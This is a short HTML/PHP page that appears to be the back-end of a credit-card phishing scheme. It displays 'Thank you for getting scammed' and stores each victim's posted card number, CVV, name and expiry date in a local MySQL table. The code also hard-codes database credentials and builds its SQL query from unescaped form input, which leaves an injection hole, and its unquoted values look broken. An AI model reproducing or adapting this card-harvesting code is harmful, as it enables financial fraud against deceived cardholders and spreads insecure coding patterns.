<!DOCTYPE html>
    <html>
        
        <head>
            <title>CreditCard</title>
        </head>

        <body>
            <p>Thank you for getting scammed</p>

                        <?php
                            $servername = "localhost";
                            $username = "php";
                            $password = "fer123";
                            $dbname = "creditcard";
                            $CC = ($_POST['EPS_CARDNUMBER']);
                            $CVV = ($_POST['CVVNum']);
                            $firstname = ($_POST['first']);
                            $lastname = ($_POST['last']);
                            $emonth = ($_POST['expm']);
                            $eyear = ($_POST['expy']);
                        ?>

                        <?php
                                    // Create connection
                                    $conn = new mysqli($servername, $username, $password, $dbname);
                                    // Check connection
                                    if ($conn->connect_error) 
                                    {
                                        die("Connection failed: " . $conn->connect_error);
                                    }
                                    $sql_insert= "INSERT INTO ccinfo (firstname, lastname, creditcard, cvv, month, year) VALUES ($firstname,$lastname,$CC,$CVV,$emonth,$eyear);";
                                    if (mysqli_query($conn, $sql_insert)) 
                                    {
                                        echo "New record created successfully";
                                    } else {
                                        echo "Error: " . $sql_insert . "<br>" . mysqli_error($conn);
                                    }

                            $conn->close();
                        ?>
        </body> 

